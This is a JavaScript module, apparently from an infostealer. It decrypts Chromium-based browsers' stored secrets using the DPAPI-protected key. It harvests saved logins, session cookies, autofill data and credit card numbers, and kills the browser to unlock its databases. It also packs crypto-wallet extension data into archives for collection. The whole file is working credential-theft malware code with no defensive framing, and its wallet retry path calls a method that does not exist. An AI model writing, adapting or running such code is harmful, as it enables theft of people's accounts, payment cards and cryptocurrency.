const fs = require("fs-extra");
const wincrypt = require("wincrypt");
const sqlite = require("./sqlite");
const crypto = require("node:crypto");
const path = require("node:path");
const psl = require("psl");
const { toUnicode } = require("punycode");
const Util = require("./Util");
const GlobalUtil = require("../globals/GlobalUtil");
const tmp = require("./tmp");
const paths = require("../config/path");
const { setTimeout: sleep } = require("node:timers/promises");

class BrowserData {
  static async getEncryptKey(browserPath) {
    const localState = await fs.readFile(
      path.resolve(browserPath, "Local State")
    );
    const saltString = GlobalUtil.toJSON(localState).os_crypt.encrypted_key;
    const salt = Buffer.from(saltString, "base64").subarray(5);

    return wincrypt.unprotectData(salt);
  }

  /**
   * @param {Buffer} value
   * @param {Buffer} key
   * @returns {string}
   */
  static decryptValue(value, key) {
    if (!value) return null;
    try {
      const magicHeader = Buffer.from([1, 0, 0, 0]);

      if (value.subarray(0, 4).equals(magicHeader))
        return wincrypt.unprotectData(value);
      else {
        const start = value.subarray(3, 15);
        const middle = value.subarray(15, value.length - 16);
        const end = value.subarray(value.length - 16, value.length);
        const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

        decipher.setAuthTag(end);

        return (
          decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8")
        );
      }
    } catch {
      return null;
    }
  }

  static async getPasswords(profile, key) {
    const loginPath = path.resolve(profile, "Login Data");

    if (!fs.pathExistsSync(loginPath)) return;

    const outputPath = tmp.file("passwords");

    await fs.copy(loginPath, outputPath);

    const passwords = [];
    const sites = [];

    for (const row of sqlite(
      outputPath,
      "SELECT origin_url, username_value, password_value FROM logins"
    )) {
      if (!row?.password_value || !row?.origin_url) continue;

      const password = BrowserData.decryptValue(row.password_value, key);

      if (!password) continue;

      const url = new URL(row.origin_url).hostname;

      passwords.push({
        url: Util.tryCatch(() => toUnicode(url), url),
        username: row.username_value,
        password
      });

      sites.push(
        Util.tryCatch(() => toUnicode(psl.parse(url).sld || url), url)
      );
    }

    return { passwords, sites };
  }

  static async getCookies(profile, key, program) {
    const cookiesPath = path.resolve(profile, "Network/Cookies");

    if (!fs.pathExistsSync(cookiesPath)) return;

    const outputPath = tmp.file();

    const copyFail = await fs.copy(cookiesPath, outputPath).catch(() => true);

    if (copyFail) {
      if (!program) return;
      await Util.killExe(program);
      await sleep(500);
      return await BrowserData.getCookies(profile, key);
    }

    const cookies = sqlite(
      outputPath,
      "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies"
    ).map((row) => ({
      host: row.host_key,
      name: row.name,
      value: row.value || BrowserData.decryptValue(row.encrypted_value, key),
      expiryAt: row.expires_utc
    }));

    return cookies;
  }

  static async getWebdata(profile, key, program) {
    const webdataPath = path.resolve(profile, "Web Data");

    if (!fs.pathExistsSync(webdataPath)) return;

    const outputPath = tmp.file();

    const copyFail = await fs.copy(webdataPath, outputPath).catch(() => true);

    if (copyFail) {
      if (!program) return;
      await Util.killExe(program);
      await sleep(500);
      return await BrowserData.getWebdata(profile, key);
    }

    const autofill = sqlite(outputPath, "SELECT name, value FROM autofill").map(
      (row) => ({
        name: row?.name,
        value: row?.value
      })
    );

    const cards = sqlite(
      outputPath,
      "SELECT name_on_card, origin, billing_address_id, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    ).map((row) => ({
      number: BrowserData.decryptValue(row?.card_number_encrypted, key),
      name: row?.name_on_card,
      origin: row?.origin,
      address: row?.billing_address_id,
      expirie: {
        month: row?.expiration_month,
        year: row?.expiration_year
      }
    }));

    return { autofill, cards };
  }

  static async getAndSaveWallets(profile, outDir, program, tri) {
    if (tri > 3) return;

    const localExtensionSettings = path.join(
      profile,
      "Local Extension Settings"
    );

    if (!fs.pathExistsSync(localExtensionSettings)) return;

    const wallets = {};

    for (const [wallet, walletId] of Object.entries(paths.wallets)) {
      try {
        const walletPath = path.join(localExtensionSettings, walletId);

        if (!fs.pathExistsSync(walletPath)) continue;

        await fs.ensureDir(outDir);

        const arhiveFail = await Util.tarc(
          walletPath,
          path.join(outDir, wallet + ".tgz")
        ).catch(() => true);

        if (arhiveFail) {
          if (!program) return;
          await Util.killExe(program);
          await fs.remove(outDir).catch(() => {});
          await sleep(400);
          return await BrowserData.get(profile, outDir, program, tri++);
        }

        wallets[wallet] = true;
      } catch (e) {
        Util.report(e);
      }
    }

    return wallets;
  }
}

module.exports = BrowserData;
